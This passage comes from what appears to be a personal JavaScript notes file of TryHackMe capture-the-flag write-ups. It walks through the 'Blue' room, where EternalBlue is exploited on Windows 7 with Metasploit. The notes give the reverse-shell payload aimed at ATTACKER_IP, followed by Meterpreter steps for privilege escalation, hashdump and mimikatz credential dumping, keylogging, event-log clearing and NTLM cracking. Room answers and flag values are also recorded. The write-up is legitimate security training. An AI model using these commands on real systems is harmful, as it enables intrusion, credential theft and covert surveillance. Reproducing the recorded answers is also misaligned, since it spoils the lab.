  Username:RID:LM_hash:NTLM_hash:::
  Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931:::
  Jon:1000:aad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

  aad3b435b51404eeaad3b435b51404ee = empty LM hash (LM disabled)
  Crack NTLM with: hashcat -m 1000 -a 0 hash.txt rockyou.txt
  Or use: CrackStation.net

MIGRATE STRATEGY:
  → Migrate to SYSTEM-owned, stable, long-running process
  → Good targets: spoolsv.exe, svchost.exe, explorer.exe
  → Avoid migrating from SYSTEM to user-owned process
  → Required for keyscan (migrate to target app, e.g. notepad.exe)`,
        commands: [
          '// Upgrade shell to meterpreter:',
          'use post/multi/manage/shell_to_meterpreter',
          'set SESSION 1',
          'run',
          '// Load Kiwi (mimikatz):',
          'load kiwi',
          'creds_all',
          'lsa_dump_sam',
          '// Keystroke logging:',
          'migrate PID_OF_TARGET_APP',
          'keyscan_start',
          '// wait for user to type...',
          'keyscan_dump',
          'keyscan_stop',
          '// Local exploit suggestions:',
          'run post/multi/recon/local_exploit_suggester',
          '// Hash dump and crack:',
          'hashdump',
          '// Take screenshot:',
          'screenshot',
          '// Full sysinfo:',
          'sysinfo',
        ],
        answer: null,
      },
    ],
    tools: ["Meterpreter", "Kiwi (mimikatz)", "post/multi/manage/shell_to_meterpreter"],
    mitre: [
      "T1003.002 — OS Credential Dumping: SAM",
      "T1056.001 — Input Capture: Keylogging",
      "T1548.002 — Abuse Elevation Control Mechanism",
      "T1055 — Process Injection (migrate)",
    ],
    personalNotes:
      "Meterpreter post-exploitation checklist: getuid → getsystem → getuid (verify SYSTEM) → hashdump → search flags. load kiwi for creds_all. migrate to SYSTEM process for stability. shell_to_meterpreter post module upgrades basic shell. clearev cleans Windows event logs. keyscan requires migrating to the target process first.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "blue",
    title: "Blue",
    platform: "TryHackMe",
    category: "Exploitation",
    difficulty: "Easy",
    icon: "💙",
    completed: true,
    tags: ["EternalBlue", "MS17-010", "Windows", "Meterpreter", "hashdump", "Privilege Escalation", "CTF"],
    overview:
      "A guided Windows exploitation room. Exploit MS17-010 (EternalBlue) on a vulnerable Windows 7 machine using Metasploit, upgrade the shell to Meterpreter, escalate privileges to NT AUTHORITY\\SYSTEM, dump password hashes using hashdump, crack the NTLM hash of user Jon, and find three flags planted in key Windows locations.",
    keyLearnings: [
      "MS17-010 (EternalBlue) affects Windows SMB — 3 ports open under 1000 on this target",
      "Exploit path: exploit/windows/smb/ms17_010_eternalblue | Required parameter: RHOSTS",
      "Payload for this room: windows/x64/shell/reverse_tcp",
      "Upgrade shell to Meterpreter: post/multi/manage/shell_to_meterpreter | Required: SESSION",
      "getsystem + getuid confirms NT AUTHORITY\\SYSTEM access",
      "Migrate to a SYSTEM process shown by ps for stability",
      "hashdump — non-default user is Jon | NTLM hash cracked to: alqfna22",
      "Flag 1: system root (C:\\) | Flag 2: SAM database location | Flag 3: Administrator's Documents",
      "Machine does NOT respond to ping — use -Pn in Nmap scans",
    ],
    tasks: [
      {
        num: 1,
        title: "Recon — Nmap Scan",
        notes: `TARGET: Windows 7 machine
NOTE: Machine does NOT respond to ping (ICMP) — use -Pn flag with Nmap

NMAP SCAN:
  nmap -sS -sV --script=vuln -Pn TARGET_IP

RESULTS:
  Port 135/tcp  → msrpc
  Port 139/tcp  → netbios-ssn
  Port 445/tcp  → microsoft-ds (SMB)
  + higher ports

  Ports under 1000: 3 (135, 139, 445)

VULNERABILITY IDENTIFIED:
  ms17-010 (EternalBlue)
  → CVE-2017-0143 through CVE-2017-0148
  → Affects SMBv1 on Windows 7/Server 2008
  → NSA exploit leaked by Shadow Brokers April 2017
  → Used in WannaCry ransomware May 2017

Nmap script check:
  nmap -sV -p 445 --script=smb-vuln-ms17-010 -Pn TARGET_IP`,
        commands: [
          'nmap -sS -sV -Pn TARGET_IP',
          'nmap -sV -p 445 --script=smb-vuln-ms17-010 -Pn TARGET_IP',
          '// In Metasploit:',
          'use auxiliary/scanner/smb/smb_ms17_010',
          'set RHOSTS TARGET_IP',
          'run',
        ],
        answer: "3",
      },
      {
        num: 2,
        title: "Gain Access — Exploit MS17-010",
        notes: `EXPLOITATION STEPS:

1. Launch Metasploit:
   msfconsole

2. Find and select the exploit:
   search ms17-010
   use exploit/windows/smb/ms17_010_eternalblue

3. Check and set options:
   show options
   set RHOSTS TARGET_IP

4. Set the payload (as instructed in room):
   set payload windows/x64/shell/reverse_tcp

5. Set LHOST (your AttackBox IP):
   set LHOST ATTACKER_IP

6. Run the exploit:
   exploit

7. Get a shell on the target — background it:
   CTRL+Z → background shell session

EXPLOIT DETAILS:
  Module: exploit/windows/smb/ms17_010_eternalblue
  Required value: RHOSTS (target IP)
  Default payload: windows/x64/meterpreter/reverse_tcp
  Room payload: windows/x64/shell/reverse_tcp

WHAT HAPPENS:
  → EternalBlue exploits buffer overflow in SMBv1 srv!SrvOs2FeaToNt
  → Achieves RIP hijack via srvnet!SrvNetWskReceiveComplete
  → Delivers payload as NT AUTHORITY\\SYSTEM`,
        commands: [
          'msfconsole',
          'search ms17-010',
          'use exploit/windows/smb/ms17_010_eternalblue',
          'show options',
          'set RHOSTS 10.10.X.X',
          'set LHOST 10.10.Y.Y',
          'set payload windows/x64/shell/reverse_tcp',
          'exploit',
          '// Background the shell:',
          '// CTRL+Z',
        ],
        answer: "exploit/windows/smb/ms17_010_eternalblue",
      },
      {
        num: 3,
        title: "Escalate — Upgrade to Meterpreter",
        notes: `UPGRADE SHELL TO METERPRETER:

1. Background current shell:
   CTRL+Z → confirm with y

2. Use the shell_to_meterpreter post module:
   use post/multi/manage/shell_to_meterpreter
   show options  → requires SESSION

3. Find session ID:
   sessions      → list all sessions; note the ID of your shell

4. Set and run:
   set SESSION 1  (use your actual session ID)
   run

5. Interact with new Meterpreter session:
   sessions       → find the new Meterpreter session ID
   sessions -i 2  → interact with it

6. Verify SYSTEM access:
   getsystem      → attempts privilege escalation
   getuid         → should show: NT AUTHORITY\SYSTEM

7. Confirm with shell:
   shell
   whoami         → should show: nt authority\system
   exit           → return to meterpreter

8. Find stable SYSTEM process to migrate to:
   ps             → list processes; find one running as NT AUTHORITY\SYSTEM
                    (e.g. spoolsv.exe, svchost.exe)
   migrate PID    → migrate to stable SYSTEM process

NOTE: Migrating from SYSTEM to a lower-privilege process = losing SYSTEM rights`,
        commands: [
          '// Background shell:',
          'CTRL+Z',
          '// Upgrade shell:',
          'use post/multi/manage/shell_to_meterpreter',
          'set SESSION 1',
          'run',
          '// Interact with new Meterpreter session:',
          'sessions',
          'sessions -i 2',
          '// Escalate and verify:',
          'getsystem',
          'getuid',
          '// Shell verification:',
          'shell',
          'whoami',
          'exit',
          '// Migrate to stable process:',
          'ps',
          'migrate 1304   // use actual PID of a SYSTEM process',
        ],
        answer: "post/multi/manage/shell_to_meterpreter",
      },
      {
        num: 4,
        title: "Cracking — hashdump and Password Crack",
        notes: `DUMP NTLM HASHES:
  hashdump

  Expected output:
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

NON-DEFAULT USER: Jon (RID 1000; Administrator and Guest are built-in defaults)

JON'S NTLM HASH: ffb43f0de35be4d9917ac0cc8ad57f8d

CRACK THE HASH:
  echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
  john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

  OR with Hashcat:
  hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

  RESULT: alqfna22

HASH FORMAT EXPLANATION:
  Jon:1000:aad3b435...:ffb43f0de35be4d9:::
  Username : RID : LM_hash : NTLM_hash
  aad3b435b51404eeaad3b435b51404ee = null/empty LM hash (LM disabled)`,
        commands: [
          '// In Meterpreter:',
          'hashdump',
          '// Save Jon\'s hash:',
          'echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > jon_hash.txt',
          '// Crack with John:',
          'john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt',
          '// Crack with Hashcat:',
          'hashcat -m 1000 -a 0 jon_hash.txt /usr/share/wordlists/rockyou.txt',
          '// Show cracked:',
          'john --show --format=nt jon_hash.txt',
        ],
        answer: "alqfna22",
      },
      {
        num: 5,
        title: "Find Flags",
        notes: `FLAG LOCATIONS AND VALUES:

FLAG 1 — System Root (C:\\):
  Location hint: "system root"
  search -f flag*.txt
  OR navigate to: cat C:\\flag1.txt
  Value: flag{access_the_machine}

FLAG 2 — SAM Database Location:
  Location hint: "where passwords are stored within Windows"
  SAM database is at: C:\\Windows\\System32\\config\\SAM
  Flag stored in that directory
  Value: flag{sam_database_elevated_access}
  Note: Windows may occasionally delete this flag — restart and re-exploit if missing

FLAG 3 — Administrator's Documents:
  Location hint: "excellent location to loot" + "Administrators usually have interesting things saved"
  Jon's/Admin's Documents folder
  Value: flag{admin_documents_can_be_valuable}

FINDING FLAGS IN METERPRETER:
  search -f flag*.txt    → search for all flag files from current location
  search -f flag*.txt -d C:\\  → search from C:\ root
  cat C:\\flag1.txt       → read a found flag

KEY WINDOWS LOCATIONS TO REMEMBER:
  System Root:    C:\\ or C:\\Windows
  SAM Database:   C:\\Windows\\System32\\config\\
  User Documents: C:\\Users\\USERNAME\\Documents
  Admin Desktop:  C:\\Users\\Administrator\\Desktop`,
        commands: [
          '// Search for all flags:',
          'search -f flag*.txt',
          '// Read flags:',
          'cat C:\\\\flag1.txt',
          'cat "C:\\\\Windows\\\\System32\\\\config\\\\flag2.txt"',
          '// Navigate to Admin Documents:',
          'cd "C:\\\\Users\\\\Jon\\\\Documents"',
          'ls',
          'cat flag3.txt',
          '// Alternative: shell command',
          'shell',
          'type C:\\flag1.txt',
          'dir /s /b C:\\flag*.txt  // find all flags from C:\\ ',
        ],
        answer: null,
      },
    ],
    tools: ["Nmap", "Metasploit (ms17_010_eternalblue)", "Meterpreter", "John the Ripper", "Hashcat"],
    mitre: [
      "T1210 — Exploitation of Remote Services (EternalBlue)",
      "T1003.002 — OS Credential Dumping: SAM",
      "T1548.002 — Abuse Elevation Control Mechanism (getsystem)",
    ],
    personalNotes:
      "Blue room workflow: nmap -Pn → ms17_010_eternalblue → background shell → shell_to_meterpreter → getsystem → hashdump → crack NTLM. Jon's password is alqfna22. Use search -f flag*.txt to find all flags. Machine doesn't respond to ping — always use -Pn. Flag 2 location is C:\\Windows\\System32\\config\\ (SAM directory).",
  },

];

// Categories for sidebar filter
export const VAULT_CATEGORIES = [
  "All",
  "Web Security",
  "Incident Response",
  "OSINT",
  "Linux",
  "Windows",
  "Active Directory",
  "Networking",
  "Network Forensics",
  "Enumeration",
  "Malware Analysis",
  "Threat Hunting",
  "Privilege Escalation",
  "Cryptography",
  "Exploitation",
];